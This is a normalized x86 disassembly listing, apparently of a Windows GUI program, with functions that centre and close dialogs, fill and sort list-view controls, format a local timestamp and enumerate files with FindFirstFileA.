call [ lstrcpynA@IAT ]
mov cl [ eax + edi + 0x1 ]
inc edi
cmp cl 0x30
jge r-xdata
sub_4207d0
mov ecx [ esp + 0x4 ]
mov eax [ rw-data ]
lea edx [ ecx * 4 + 0xc ]
cmp edx eax
jg r-xdata
retn
lea ecx [ ecx * 4 + 0xf ]
cmp eax ecx
jg r-xdata
mov edx [ rw-data ]
push 0x1
push 0xffffffff
xor ecx ecx
push edx
push eax
mov [ rw-data ] ecx
mov [ rw-data ] ecx
call sub_486df0
add esp 0x10
sub_420820
sub esp 0xc
push ebx
mov ebx [ lstrcpynA@IAT ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi [ esp + 0x20 ]
push edi
mov [ esp + 0x10 ] 0x0
sub ebp esi
nop
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc
retn
jg r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xc
retn
mov eax [ esp + 0x10 ]
inc eax
add esi 0x3
cmp eax 0x6
mov [ esp + 0x10 ] eax
jl r-xdata
push 0x3
lea eax [ esi + ebp ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
call ebx
push 0x3
push esi
lea edx [ esp + 0x20 ]
push edx
call ebx
lea eax [ esp + 0x14 ]
push eax
call j_sub_4b692d
lea ecx [ esp + 0x1c ]
push ecx
mov edi eax
call j_sub_4b692d
add esp 0x8
cmp edi eax
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
sub_4208b0
mov eax [ esp + 0x8 ]
sub esp 0x20
sub eax 0x110
push esi
push edi
je r-xdata
mov eax [ rw-data ]
mov esi [ GetWindowRect@IAT ]
lea edx [ esp + 0x18 ]
push edx
push eax
call esi
mov edi [ esp + 0x2c ]
lea ecx [ esp + 0x8 ]
push ecx
push edi
call esi
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0xc ]
mov edx [ esp + 0x24 ]
sub eax ecx
mov ecx [ esp + 0x1c ]
sub eax ecx
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x20 ]
sar eax 0x1
add eax ecx
mov ecx [ esp + 0x10 ]
push 0x5
push 0x0
push 0x0
push eax
mov eax [ esp + 0x18 ]
sub eax ecx
mov ecx [ esp + 0x28 ]
sub eax ecx
add eax edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push edi
call [ SetWindowPos@IAT ]
dec eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x20
retn
mov eax [ esp + 0x34 ]
cmp ax 0x1
jne r-xdata
cmp ax 0x2
jne r-xdata
mov esi [ esp + 0x2c ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x54f
push esi
call edi
test eax eax
je r-xdata
cmp ax 0x3
jne r-xdata
mov eax [ esp + 0x2c ]
push 0xffffffff
push eax
call [ EndDialog@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x20
retn
push 0x550
push esi
call edi
test eax eax
je r-xdata
push 0x4
push esi
call [ EndDialog@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x20
retn
mov ecx [ esp + 0x2c ]
push 0xfffffffe
push ecx
call [ EndDialog@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x20
retn
push 0xffffffff
push esi
call [ EndDialog@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x20
retn
push 0x5
push esi
call [ EndDialog@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x20
retn
sub_420a10
mov eax [ rw-data ]
sub esp 0xa0
test eax eax
je r-xdata
add esp 0xa0
retn
push ebx
push ebp
mov ebp [ rw-data ]
and ebp 0x7
push esi
mov ebx ebp
xor esi esi
shl ebx 0x4
push edi
jmp r-xdata
mov ecx [ ebx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebx + rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
xor edx edx
pop edi
xor eax eax
mov ecx 0x8
lea edi [ esp + 0x10 ]
[ edi ]
mov ecx [ rw-data ]
lea eax [ esp + 0x10 ]
push eax
push esi
push 0x1019
push ecx
mov [ esp + 0x20 ] 0x22
call [ SendMessageA@IAT ]
mov edx [ ebx + rw-data ]
mov edi [ esp + 0x18 ]
lea ecx [ edx + esi * 4 ]
mov edx [ ecx ]
mov eax ebp
shl eax 0x5
add edx eax
mov [ edx * 4 + rw-data ] edi
mov edx [ ecx ]
add edx eax
mov eax [ esp + 0x2c ]
mov [ edx * 4 + rw-data ] eax
mov ecx [ ecx ]
mov [ esp + eax * 4 + 0x30 ] ecx
inc esi
jmp r-xdata
cmp esi eax
jge r-xdata
mov eax [ ebx + rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
pop esi
pop ebp
pop ebx
mov ecx [ esp + edx * 4 + 0x2c ]
mov eax [ ebx + rw-data ]
mov [ eax + edx * 4 ] ecx
inc edx
jmp r-xdata
cmp edx eax
jge r-xdata
mov ecx [ ebx + rw-data ]
test ecx ecx
jne r-xdata
sub_420b00
mov ecx [ esp + 0x4 ]
test ecx ecx
jne r-xdata
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
or eax 0xffffffff
retn 0xc
mov eax [ ecx + 0x380 ]
mov edx [ esp + 0x10 ]
shl eax 0x4
mov eax [ eax + rw-data ]
and edx 0xffff7fff
mov eax [ eax + edx * 4 ]
test eax eax
push ebx
push edi
jne r-xdata
mov eax 0x1
pop esi
retn 0xc
cmp [ eax * 4 + rw-data ] 0x73
jne r-xdata
mov eax [ esi + 0x34 ]
mov edx 0x10
cmp eax edx
push ebp
jb r-xdata
mov edi eax
imul edi edi 0x1c
add ecx edi
call sub_41f020
lea ecx [ edi + esi ]
mov ebx eax
call sub_41f020
xor ecx ecx
cmp ebx eax
setge cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
imul eax eax 0x1c
mov edi [ eax + esi + 0x18 ]
mov edx 0x10
cmp edi edx
jb r-xdata
lea ebp [ esi + 0x20 ]
mov ebp [ esi + 0x20 ]
jmp r-xdata
pop esi
retn 0xc
neg eax
lea esi [ eax + esi + 0x4 ]
mov esi [ eax + esi + 0x4 ]
jmp r-xdata
add esi 0x20
mov esi [ esi + 0x20 ]
jmp r-xdata
cmp [ esi + 0x34 ] edx
jb r-xdata
lea eax [ eax + ecx + 0x4 ]
mov eax [ eax + ecx + 0x4 ]
jmp r-xdata
cmp [ eax + ecx + 0x18 ] edx
jb r-xdata
lea ebx [ ecx + 0x20 ]
mov ebx [ ecx + 0x20 ]
jmp r-xdata
cmp [ ecx + 0x34 ] edx
jb r-xdata
mov ecx [ esp + 0x18 ]
test ch ch
pop edi
pop ebx
js r-xdata
push 0xffffffff
push esi
push 0xffffffff
push eax
push 0x1
push 0x800
call [ CompareStringA@IAT ]
dec eax
neg eax
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
lea edi [ ecx + 0x20 ]
mov edi [ ecx + 0x20 ]
jmp r-xdata
cmp [ ecx + 0x34 ] edx
jb r-xdata
push 0xffffffff
push esi
call sub_457f40
add esp 0x4
add eax ebp
push eax
push 0xffffffff
push edi
call sub_457f40
add esp 0x4
add eax ebx
push eax
push 0x1
push 0x800
call [ CompareStringA@IAT ]
dec eax
neg eax
sbb eax eax
and eax 0x2
dec eax
pop ebp
jmp r-xdata
sub_420c40
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
cmp eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
je r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] edi
pop edi
pop esi
retn 0x8
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push eax
mov [ ecx + 0x4 ] edx
call j_sub_4b66ed#2
mov eax [ esi + 0x8 ]
add esp 0x4
dec eax
mov [ esi + 0x8 ] eax
sub_420c80
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
cmp esi ebx
push edi
mov edi ecx
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx [ edi + 0x4 ]
mov eax esi
cmp eax ecx
mov esi [ esi ]
je r-xdata
cmp esi ebx
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push eax
mov [ ecx + 0x4 ] edx
call j_sub_4b66ed#2
mov eax [ edi + 0x8 ]
add esp 0x4
dec eax
mov [ edi + 0x8 ] eax
sub_420cf0
push 0xc
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
retn 0xc
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx [ ecx ]
mov [ eax + 0x8 ] edx
sub_420d20
mov eax [ esp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ esp + 0x8 ]
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
neg eax
sbb eax eax
neg eax
retn
sub_420d50
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
cmp edx eax
mov ecx [ esp + 0x10 ]
push esi
je r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
pop esi
retn
mov esi [ eax - 0x4 ]
sub eax 0x4
sub ecx 0x4
cmp eax edx
mov [ ecx ] esi
jne r-xdata
sub_420d80
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
mov edx [ esp + 0xc ]
mov ecx eax
mov eax [ esp + 0x4 ]
push esi
add eax 0x4
dec ecx
jne r-xdata
mov esi [ edx ]
mov [ eax ] esi
test eax eax
je r-xdata
pop esi
sub_420db0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
xor ecx ecx
jmp r-xdata
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_420c80
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
pop ecx
retn
sub_420e40
mov eax [ esp + 0xc ]
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi eax
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn 0xc
mov esi [ ecx + 0x8 ]
cmp eax esi
mov edx edi
je r-xdata
mov [ ecx + 0x8 ] edx
mov ebx [ eax ]
mov [ edx ] ebx
add eax 0x4
add edx 0x4
cmp eax esi
jne r-xdata
sub_420e80
push 0xffffffff
push sub_4bfb38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push ebx
push esi
xor ebx ebx
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
call sub_401dd0
mov ecx [ esp + 0x40 ]
push 0xffffffff
push ebx
push ecx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x3c ] ebx
call sub_4018c0
mov esi [ esp + 0x38 ]
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov ecx [ esp + 0x28 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
mov edx [ esp + 0x10 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
sub_420f20
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_401dd0
add esi 0x1c
add edi 0x1c
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_420f60
sub esp 0x34
push esi
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0x8 ] 0x0
call [ GetLocalTime@IAT ]
movzx ecx [ esp + 0x14 ]
movzx edx [ esp + 0x12 ]
movzx eax [ esp + 0x10 ]
push ecx
movzx ecx [ esp + 0x12 ]
push edx
movzx edx [ esp + 0x12 ]
push eax
movzx eax [ esp + 0x14 ]
push ecx
push edx
cdq
mov ecx 0x64
idiv ecx
push edx
lea edx [ esp + 0x30 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov esi [ esp + 0x5c ]
lea eax [ esp + 0x38 ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
add esp 0x20
mov [ esi + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_401e80
mov eax esi
pop esi
add esp 0x34
retn
sub_420ff0
mov eax [ fs : 0x0 ]
mov edx [ esp + 0x4 ]
push 0xffffffff
push sub_4bfb58
push eax
mov [ fs : 0x0 ] esp
mov eax [ ecx + 0x8 ]
sub esp 0x44
push esi
mov esi 0x3fffffff
sub esi eax
cmp esi edx
pop esi
jae r-xdata
add eax edx
mov [ ecx + 0x8 ] eax
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x4
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
sub_4210a0
push 0xffffffff
push sub_4bfb58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_421120
mov edx [ esp + 0x4 ]
push esi
mov eax edx
push edi
mov esi ecx
lea edi [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_401e80
pop edi
mov eax esi
pop esi
retn 0x4
sub_421150
mov eax [ esp + 0x4 ]
sub esp 0x20
cmp eax 0xffffffff
push ebx
push esi
mov esi ecx
jne r-xdata
push eax
lea ecx [ esp + 0xc ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x14 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ esi + 0x18 ]
push ecx
cmp eax 0x10
mov edx esp
lea eax [ esi + 0x4 ]
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0xc ]
push edx
mov ecx esi
call sub_401e80
mov eax esi
pop esi
pop ebx
add esp 0x20
retn 0x4
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ ecx ] eax
lea eax [ esp + 0x34 ]
push eax
mov ecx esi
call sub_401c60
mov eax esi
pop esi
pop ebx
add esp 0x20
retn 0x4
mov eax [ eax ]
mov ebx [ esi + 0x14 ]
add ebx ecx
mov [ edx ] ebx
cmp [ esi + 0x18 ] 0x10
push ecx
mov ecx esp
jb r-xdata
sub_4211e0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
cmp [ eax + 0x18 ] 0x10
push edi
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov eax edx
lea edi [ eax + 0x1 ]
jmp r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_401e80
pop edi
mov eax esi
pop esi
retn 0x4
sub_421220
sub esp 0x50
mov eax [ esp + 0x54 ]
push ebx
push ebp
push esi
mov [ esp + 0x10 ] eax
mov al [ esp + 0x68 ]
push edi
mov edi [ esp + 0x68 ]
xor esi esi
cmp al 0x1
mov [ esp + 0x10 ] 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x30 ] edi
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x10 ]
push eax
push esi
push 0x1006
push ecx
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push esi
push 0x1007
push edx
jmp r-xdata
mov eax [ edi + 0x380 ]
shl eax 0x4
mov edx [ eax + rw-data ]
test edx edx
jne r-xdata
call [ SendMessageA@IAT ]
mov [ esp + 0x6c ] esi
mov ebp 0x10
jmp r-xdata
mov ecx [ eax + rw-data ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
mov edx [ eax + rw-data ]
mov eax [ edx + esi * 4 ]
test eax eax
jne r-xdata
cmp esi ecx
jge r-xdata
cmp eax 0x12
jne r-xdata
cmp [ edi + 0x34 ] ebp
jb r-xdata
cmp eax 0x15
jne r-xdata
mov ecx [ edi + 0x210 ]
cmp ecx ebp
lea ebx [ edi + 0x1f8 ]
jb r-xdata
lea ebx [ edi + 0x20 ]
mov ebx [ edi + 0x20 ]
jmp r-xdata
imul eax eax 0x1c
mov ecx [ eax + edi + 0x18 ]
add eax edi
cmp ecx ebp
jb r-xdata
mov ecx [ edi + 0x264 ]
cmp ecx ebp
lea ebx [ edi + 0x24c ]
jb r-xdata
lea ecx [ ebx + 0x4 ]
mov ecx [ ebx + 0x4 ]
jmp r-xdata
lea eax [ edi + 0x20 ]
push eax
call sub_457f40
mov esi eax
add esp 0x4
add esi ebx
jmp r-xdata
mov eax [ edi + 0x20 ]
push eax
call sub_457f40
mov esi eax
add esp 0x4
add esi ebx
jmp r-xdata
cmp [ edi + 0x34 ] ebp
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
lea ecx [ ebx + 0x4 ]
mov ecx [ ebx + 0x4 ]
jmp r-xdata
cmp [ edi + 0x34 ] ebp
jb r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov ecx [ esp + 0x64 ]
mov edx [ rw-data ]
mov ebx [ esp + 0x6c ]
lea eax [ esp + 0x38 ]
push eax
push ecx
push 0x102e
push edx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x5c ] esi
call [ SendMessageA@IAT ]
inc ebx
mov [ esp + 0x6c ] ebx
mov esi ebx
jmp r-xdata
cmp [ edi + 0x34 ] ebp
jb r-xdata
cmp [ ecx ] 0x0
jne r-xdata
lea esi [ edi + 0x20 ]
mov esi [ edi + 0x20 ]
jmp r-xdata
lea esi [ edi + 0x20 ]
mov esi [ edi + 0x20 ]
jmp r-xdata
lea eax [ edi + 0x20 ]
mov eax [ edi + 0x20 ]
jmp r-xdata
cmp [ edi + 0x34 ] ebp
jb r-xdata
lea eax [ edi + 0x20 ]
mov eax [ edi + 0x20 ]
jmp r-xdata
cmp [ edi + 0x34 ] ebp
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
mov ecx ebx
call sub_401e80
jmp r-xdata
push eax
call sub_457f40
add eax esi
push eax
call sub_420660
add esp 0x8
mov esi eax
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
mov ecx ebx
call sub_401e80
jmp r-xdata
push eax
call sub_457f40
add eax esi
push eax
call sub_4206f0
add esp 0x8
mov esi eax
lea edx [ eax + 0x1 ]
sub_421430
sub esp 0x28
push ebx
push ebp
push esi
push edi
call sub_430320
mov edi [ rw-data ]
mov eax [ rw-data ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x1009
and edi 0x7
push eax
mov [ esp + 0x20 ] edi
call ebp
mov esi 0x20
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x101c
push ecx
call ebp
dec esi
jne r-xdata
mov eax [ edi * 4 + rw-data ]
mov ecx [ rw-data ]
mov edx eax
and edx 0xff
shl edx 0x10
and eax 0xff00
or edx eax
movzx eax [ edi * 4 + rw-data ]
or edx eax
push edx
push 0x0
push 0x1001
push ecx
call ebp
mov eax [ edi * 4 + rw-data ]
mov ecx [ rw-data ]
mov edx eax
and edx 0xff
shl edx 0x10
and eax 0xff00
or edx eax
movzx eax [ edi * 4 + rw-data ]
or edx eax
push edx
push 0x0
push 0x1026
push ecx
call ebp
mov eax [ edi * 4 + rw-data ]
movzx ecx [ edi * 4 + rw-data ]
mov edx eax
and edx 0xff
shl edx 0x10
or edx ecx
and eax 0xff00
or edx eax
push edx
mov edx [ rw-data ]
push 0x0
push 0x1024
push edx
call ebp
shl edi 0x4
mov esi [ edi + rw-data ]
mov eax [ edi + rw-data ]
xor ebx ebx
cmp esi eax
je r-xdata
mov eax [ esp + 0x10 ]
lea edi [ eax + eax * 2 ]
shl edi 0x2
mov eax [ edi + rw-data ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
shl ecx 0x5
mov [ esp + 0x14 ] ecx
jmp r-xdata
cmp eax [ edi + rw-data ]
mov esi eax
je r-xdata
mov eax [ eax ]
mov eax [ esi ]
mov edx [ eax * 4 + rw-data ]
add ecx eax
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x20 ] ecx
mov ecx [ eax * 4 + rw-data ]
mov [ esp + 0x24 ] edx
xor edx edx
cmp ecx 0x73
mov ecx [ rw-data ]
lea eax [ esp + 0x18 ]
push eax
setne dl
push ebx
push 0x101b
push ecx
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x3c ] ebx
mov [ esp + 0x2c ] edx
call ebp
mov eax [ edi + rw-data ]
add esi 0x4
inc ebx
cmp esi eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
lea ecx [ ecx ]
mov ecx [ esp + 0x14 ]
lea esp [ esp ]
mov edx [ esi + 0x8 ]
push 0x1
push edx
push ebx
call sub_421220
mov esi [ esi ]
mov eax [ edi + rw-data ]
add esp 0xc
inc ebx
cmp esi eax
jne r-xdata
sub_4215f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfb7b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x188
push ebp
push esi
mov esi [ esp + 0x1a0 ]
xor ebp ebp
cmp esi ebp
jne r-xdata
mov eax [ rw-data ]
push ebx
push edi
mov edi [ esi + 0x380 ]
push eax
lea ecx [ esi + 0x54 ]
call sub_421150
lea ecx [ esp + 0x14 ]
push ecx
call sub_420f60
add esp 0x4
push 0xffffffff
push ebp
lea ecx [ esi + 0xa8 ]
push eax
mov [ esp + 0x1ac ] ebp
call sub_401dd0
mov eax [ esp + 0x2c ]
mov ebx 0x10
cmp eax ebx
mov [ esp + 0x1a0 ] 0xffffffff
jb r-xdata
pop esi
xor eax eax
pop ebp
mov ecx [ esp + 0x188 ]
mov [ fs : 0x0 ] ecx
add esp 0x194
retn
cmp [ esi + 0x34 ] ebx
jb r-xdata
mov edx [ esp + 0x18 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
lea eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
jmp r-xdata
mov ecx [ rw-data ]
mov eax edi
or eax 0x8
cmp ecx eax
jne r-xdata
mov edx [ esp + 0x78 ]
push edx
lea ecx [ esi + 0x8c ]
call sub_421150
push ebx
call [ FindClose@IAT ]
lea ecx [ esp + 0x58 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov eax 0x1
lea ecx [ edi + edi * 2 ]
shl ecx 0x2
mov eax [ ecx + rw-data ]
xor edx edx
cmp eax ebp
mov [ esp + 0x10 ] edx
jne r-xdata
mov eax [ eax ]
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov ecx [ ecx + rw-data ]
cmp eax ecx
je r-xdata
mov ecx [ esp + 0x198 ]
pop edi
pop ebx
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x194
retn
cmp eax ecx
mov [ esp + 0x10 ] edx
jne r-xdata
mov eax [ eax ]
inc edx
cmp eax ecx
jne r-xdata
shl edi 0x4
nop
mov eax [ edi + rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ edi + rw-data ]
mov eax [ ecx + ebp * 4 ]
test eax eax
jne r-xdata
cmp ebp eax
jge r-xdata
imul eax eax 0x1c
mov ecx [ eax + esi + 0x18 ]
add eax esi
cmp ecx 0x10
jb r-xdata
mov ecx [ esi + 0x34 ]
mov eax 0x10
cmp ecx eax
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea ebx [ esi + 0x20 ]
mov ebx [ esi + 0x20 ]
jmp r-xdata
mov ecx [ edi + rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x48 ] eax
mov eax [ esp + 0x14 ]
push eax
push 0x102e
push ecx
mov [ esp + 0x48 ] ebp
call [ SendMessageA@IAT ]
inc ebp
jmp r-xdata
lea eax [ esi + 0x20 ]
push eax
call sub_457f40
add esp 0x4
add eax ebx
jmp r-xdata
mov eax [ esi + 0x20 ]
push eax
call sub_457f40
add esp 0x4
add eax ebx
jmp r-xdata
cmp [ esi + 0x34 ] eax
jb r-xdata
sub_4217f0
mov edx [ esp + 0x8 ]
sub esp 0x68
push esi
mov esi [ esp + 0x78 ]
cmp esi edx
je r-xdata
pop esi
add esp 0x68
retn
mov eax [ rw-data ]
and eax 0x7
mov [ esp + 0xc ] eax
mov eax [ esp + 0x70 ]
lea eax [ eax + eax * 2 ]
push ebx
shl eax 0x2
sub edx esi
mov ecx [ eax + rw-data ]
push ebp
push edi
mov [ esp + 0x1c ] ecx
jns r-xdata
mov eax [ eax + rw-data ]
test eax eax
mov [ esp + 0x14 ] 0x1
je r-xdata
mov ebx [ eax + rw-data ]
mov eax ecx
sub eax esi
test eax eax
mov [ esp + 0x14 ] 0xffffffff
jle r-xdata
test esi esi
mov [ esp + 0x84 ] eax
jle r-xdata
mov eax [ eax ]
mov ebp [ SendMessageA@IAT ]
jmp r-xdata
dec eax
mov edx [ ebx + 0x4 ]
mov [ esp + 0x84 ] edx
mov ebx edx
jne r-xdata
mov ebx [ esp + 0x84 ]
mov eax esi
lea esp [ esp ]
test esi esi
jl r-xdata
mov ebp [ SendMessageA@IAT ]
jmp r-xdata
dec eax
mov edx [ esp + 0x84 ]
mov edx [ edx ]
mov [ esp + 0x84 ] edx
jne r-xdata
pop edi
pop ebp
pop ebx
cmp esi ecx
jge r-xdata
mov eax [ esp + 0x14 ]
lea edi [ esi + eax ]
test edi edi
jl r-xdata
cmp edi ecx
jge r-xdata
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x84 ] eax
mov edx eax
mov edx [ ebx ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x84 ] edx
jmp r-xdata
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
and eax 0x7
mov ecx [ eax * 4 + rw-data ]
cmp ecx esi
lea eax [ eax * 4 + rw-data ]
jne r-xdata
mov [ rw-data ] esi
cmp ecx edi
jne r-xdata
mov [ eax ] edi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ eax ] esi
cmp [ esp + 0x7c ] 0x3
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax [ esp + 0x7c ]
jne r-xdata
mov ecx [ edx + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ edx + 0x8 ] eax
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ edx + 0x8 ]
mov ecx [ ebx + 0x8 ]
push eax
push ecx
call sub_4293d0
mov edx [ esp + 0x18 ]
add esp 0x8
mov ecx [ rw-data ]
push 0x3
push esi
push 0x102c
push ecx
call ebp
mov edx [ rw-data ]
push 0x3
push edi
push 0x102c
push edx
mov [ esp + 0x34 ] eax
call ebp
mov edx [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x80 ]
mov esi edi
cmp esi eax
jne r-xdata
mov edx [ esp + 0x7c ]
cmp [ esp + 0x18 ] edx
jne r-xdata
mov ebx [ esp + 0x84 ]
mov ecx [ esp + 0x1c ]
lea ecx [ ecx ]
push 0x0
push eax
push edi
call sub_421220
